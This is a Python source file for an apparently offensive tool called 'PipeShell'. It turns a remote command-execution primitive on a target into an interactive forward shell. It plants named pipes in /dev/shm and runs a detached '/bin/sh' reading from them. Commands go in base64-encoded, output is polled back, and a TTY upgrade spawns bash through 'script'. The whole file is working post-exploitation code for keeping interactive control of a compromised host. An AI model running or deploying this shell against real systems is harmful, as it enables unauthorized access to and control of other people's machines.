import base64
import random
import signal
import sys
import threading
import time
from .command_executors import CommandExecutor
from .colors import bold_blue, bold_white, green

class OutputReader(threading.Thread):
    def __init__(self, stdout, command_executor, interval):
        super().__init__(daemon=True)
        self.__stdout = stdout
        self.__command_executor = command_executor
        self.__callbacks = []
        self.__interval = interval
        self.__running = True

    def register_callback(self, pattern: str, callback):
        self.__callbacks.append((pattern, callback))

    def run(self):
        while self.__running:
            output = self.__command_executor.execute(f"/bin/cat {self.__stdout} | base64")
            if output:
                self.__process_output(base64.b64decode(output).decode("utf-8", errors="replace"))
                self.__command_executor.execute(f"""echo -n '' > {self.__stdout}""")
            time.sleep(self.__interval)

    def __process_output(self, decoded_output: str):
        for pattern, callback in self.__callbacks:
            if pattern in decoded_output:
                callback()
                return
        print(decoded_output, end="")

    def stop(self):
        self.__running = False

class PipeShell:
    TTY_EXIT_MARKER = "__TTY_EXIT__"

    def __init__(self, command_executor: CommandExecutor, interval=1):
        self.__command_executor = command_executor
        self.__interval = interval

        print(f"[+] Establishing IPC on target...", end="")
        self.__create_pipes()
        self.__create_prompt()
        self.__init_reader()
        print(f"OK")
        print(f"[+] Session ID: {self.__sid}")
        print(f"[+] Shell PID: {self.__pid}\n")
        signal.signal(signal.SIGINT, self.__handle_sigint)
        self.__run()

    def __create_pipes(self):
        self.__sid = random.randrange(10000, 99999)
        self.__stdin = f"/dev/shm/input.{self.__sid}"
        self.__stdout = f"/dev/shm/output.{self.__sid}"
        self.__pidfile = f"/dev/shm/pid.{self.__sid}"
        self.__command_executor.execute(
            f"""
            mkfifo {self.__stdin} 2> /dev/null;
            nohup setsid sh -c 'tail -f {self.__stdin} | /bin/sh 2>&1 > {self.__stdout}' > /dev/null 2>&1 & echo $! > {self.__pidfile}
            """
        )
        self.__pid = self.__command_executor.execute(f"cat {self.__pidfile}")

    def __create_prompt(self):
        hostname = self.__command_executor.execute("hostname").strip()
        user = self.__command_executor.execute("whoami").strip()
        name = bold_blue(f"{user}㉿{hostname}")
        self.__prompt = self.__displayed_prompt = (
            f"{green("┌──(")}{bold_white("pipesh")}{green(")─(")}{name}{green(")")}\n"
            f"{green("└─")}{bold_blue("$")} "
        )

    def __init_reader(self):
        self.__reader = OutputReader(self.__stdout, self.__command_executor, self.__interval)
        self.__reader.register_callback(self.TTY_EXIT_MARKER, self.__on_tty_exit)
        self.__reader.start()

    def __handle_sigint(self, sig, frame):
        print("\n[!] Caught Ctrl+C, cleaning up...")
        self.__stop()
        sys.exit(0)

    def __run(self):
        self.__running = True
        while self.__running:
            command = input(self.__displayed_prompt)
            match command:
                case "/help":
                    self.__help()
                case "/upgrade":
                    self.__upgrade()
                case "/exit":
                    self.__stop()
                    break
                case _:
                    self.__write_command(command)
            time.sleep(self.__interval + 0.1)

    def __write_command(self, command):
        base64_encoded_command = base64.b64encode(f'{command.rstrip()}\n'.encode('utf-8')).decode('utf-8')
        self.__command_executor.execute(f"echo {base64_encoded_command} | base64 -d > {self.__stdin}")

    @staticmethod
    def __help():
        print(f"/help      Show this help menu")
        print(f"/upgrade   Upgrade to a fully interactive TTY")
        print(f"/exit      Exit and clean up session")

    def __upgrade(self):
        self.__displayed_prompt = ""
        print("\n[+] Spawning interactive TTY...")
        self.__write_command(f"""/usr/bin/script -qc "/bin/bash; echo {self.TTY_EXIT_MARKER} > {self.__stdout}" /dev/null""")

    def __on_tty_exit(self):
        self.__displayed_prompt = self.__prompt
        print("[+] TTY session closed, returning to PipeShell")

    def __stop(self):
        self.__reader.stop()
        self.__command_executor.execute(f"kill -9 -$(cat {self.__pidfile}) 2>/dev/null;")
        self.__command_executor.execute(f"rm -f {self.__stdin} {self.__stdout} {self.__pidfile}")
